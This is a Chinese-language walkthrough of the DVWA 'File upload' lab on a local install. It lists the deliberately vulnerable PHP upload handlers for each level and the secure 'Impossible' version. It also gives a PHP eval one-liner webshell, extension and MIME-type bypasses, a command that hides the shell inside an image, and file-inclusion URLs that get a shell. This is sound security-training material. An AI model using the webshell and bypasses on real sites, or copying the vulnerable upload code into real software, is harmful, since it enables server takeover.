<h1 id="File-upload"><a href="#File-upload" class="headerlink" title="File upload"></a>File upload</h1><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><pre><code>
&lt;?php 

if( isset( $_POST[ &apos;Upload&apos; ] ) ) { 
    // Where are we going to be writing to? 
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; 
    $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); 

    // Can we move the file to the upload folder? 
    if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) { 
        // No 
        echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; 
    } 
    else { 
        // Yes! 
        echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; 
    } 
} 

?&gt; </code></pre><p>可以看到low级别的代码没有进行任何过滤，可以直接上传一句话木马</p>
<p>一句话木马如下shell.php，内容如下</p>
<pre><code>&lt;?php @eval($_POST[&apos;shell&apos;]);?&gt;</code></pre><p>![1554621149171](E:\网络空间信息安全\测试靶场\DVWA\分类详解\File upload\assets\1554621149171.png)</p>
<p>上传成功并且知道路径，可以直接菜刀连接获得shell</p>
<p>![1554621190873](E:\网络空间信息安全\测试靶场\DVWA\分类详解\File upload\assets\1554621190873.png)</p>
<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><pre><code>
&lt;?php 

if( isset( $_POST[ &apos;Upload&apos; ] ) ) { 
    // Where are we going to be writing to? 
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; 
    $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); 

    // File information 
    $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; 
    $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ]; 
    $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; 

    // Is it an image? 
    if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; 
        ( $uploaded_size &lt; 100000 ) ) { 

        // Can we move the file to the upload folder? 
        if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) { 
            // No 
            echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; 
        } 
        else { 
            // Yes! 
            echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; 
        } 
    } 
    else { 
        // Invalid file 
        echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; 
    } 
} 

?&gt; </code></pre><p>medium级别限制了上传文件大小和文件类型，文件大小没有问题(一句话木马就一句话)，关于文件类型有以下方式绕过</p>
<p>（1）抓包更改文件后缀</p>
<p>令我们一句话木马文件为shell.php.jpg</p>
<p>![1554621532888](E:\网络空间信息安全\测试靶场\DVWA\分类详解\File upload\assets\1554621532888.png)</p>
<p>将shell.php.png改为shell.php，发送数据，文件上传成功，连接菜刀getshell</p>
<p>![1554621594473](E:\网络空间信息安全\测试靶场\DVWA\分类详解\File upload\assets\1554621594473.png)</p>
<p>（2）利用文件包含漏洞解析文件上传图片</p>
<p>将shell.php保存在shell.png，上传成功</p>
<p>![1554876473272](E:\网络空间信息安全\测试靶场\DVWA\分类详解\File upload\assets\1554876473272.png)</p>
<p>利用蚁剑，先登录网站保存cookie，然后利用文件包含漏洞把png解析为php，链接如下</p>
<pre><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA\hackable\uploads\shell.png</code></pre><p>蚁剑连接getshell</p>
<p>![1554876604347](E:\网络空间信息安全\测试靶场\DVWA\分类详解\File upload\assets\1554876604347.png)</p>
<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?php 

if( isset( $_POST[ &apos;Upload&apos; ] ) ) { 
    // Where are we going to be writing to? 
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; 
    $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); 

    // File information 
    $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; 
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); 
    $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; 
    $uploaded_tmp  = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ]; 

    // Is it an image? 
    if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; 
        ( $uploaded_size &lt; 100000 ) &amp;&amp; 
        getimagesize( $uploaded_tmp ) ) { 

        // Can we move the file to the upload folder? 
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { 
            // No 
            echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; 
        } 
        else { 
            // Yes! 
            echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; 
        } 
    } 
    else { 
        // Invalid file 
        echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; 
    } 
} 

?&gt; </code></pre><p>代码审计可知，high级别的代码进行了文件头检测，但我们可以通过图片一句话绕过</p>
<p>准备1.php和1.jpg，Dos界面执行如下命令</p>
<pre><code>copy 1.jpg/b+1.php/a shell.jpg</code></pre><p>![1554876856999](E:\网络空间信息安全\测试靶场\DVWA\分类详解\File upload\assets\1554876856999.png)</p>
<p>一句话木马制作成功，上传成功</p>
<p>![1554877060368](E:\网络空间信息安全\测试靶场\DVWA\分类详解\File upload\assets\1554877060368.png)</p>
<p>同样利用文件包含漏洞进行解析</p>
<pre><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file:///D:\phpStudy\WWW\DVWA\hackable\uploads\shell.jpg</code></pre><p>![1554877433962](E:\网络空间信息安全\测试靶场\DVWA\分类详解\File upload\assets\1554877433962.png)</p>
<p>成功getshell</p>
<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php 

if( isset( $_POST[ &apos;Upload&apos; ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); 


    // File information 
    $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; 
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); 
    $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; 
    $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ]; 
    $uploaded_tmp  = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ]; 

    // Where are we going to be writing to? 
    $target_path   = DVWA_WEB_PAGE_TO_ROOT . &apos;hackable/uploads/&apos;; 
    //$target_file   = basename( $uploaded_name, &apos;.&apos; . $uploaded_ext ) . &apos;-&apos;; 
    $target_file   =  md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext; 
    $temp_file     = ( ( ini_get( &apos;upload_tmp_dir&apos; ) == &apos;&apos; ) ? ( sys_get_temp_dir() ) : ( ini_get( &apos;upload_tmp_dir&apos; ) ) ); 
    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext; 

    // Is it an image? 
    if( ( strtolower( $uploaded_ext ) == &apos;jpg&apos; || strtolower( $uploaded_ext ) == &apos;jpeg&apos; || strtolower( $uploaded_ext ) == &apos;png&apos; ) &amp;&amp; 
        ( $uploaded_size &lt; 100000 ) &amp;&amp; 
        ( $uploaded_type == &apos;image/jpeg&apos; || $uploaded_type == &apos;image/png&apos; ) &amp;&amp; 
        getimagesize( $uploaded_tmp ) ) { 

        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) 
        if( $uploaded_type == &apos;image/jpeg&apos; ) { 
            $img = imagecreatefromjpeg( $uploaded_tmp ); 
            imagejpeg( $img, $temp_file, 100); 
        } 
        else { 
            $img = imagecreatefrompng( $uploaded_tmp ); 
            imagepng( $img, $temp_file, 9); 
        } 
        imagedestroy( $img ); 

        // Can we move the file to the web root from the temp folder? 
        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { 
            // Yes! 
            echo &quot;&lt;pre&gt;&lt;a href=&apos;${target_path}${target_file}&apos;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;; 
        } 
        else { 
            // No 
            echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; 
        } 

        // Delete any temp files 
        if( file_exists( $temp_file ) ) 
            unlink( $temp_file ); 
    } 
    else { 
        // Invalid file 
        echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; 
    } 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?&gt; </code></pre>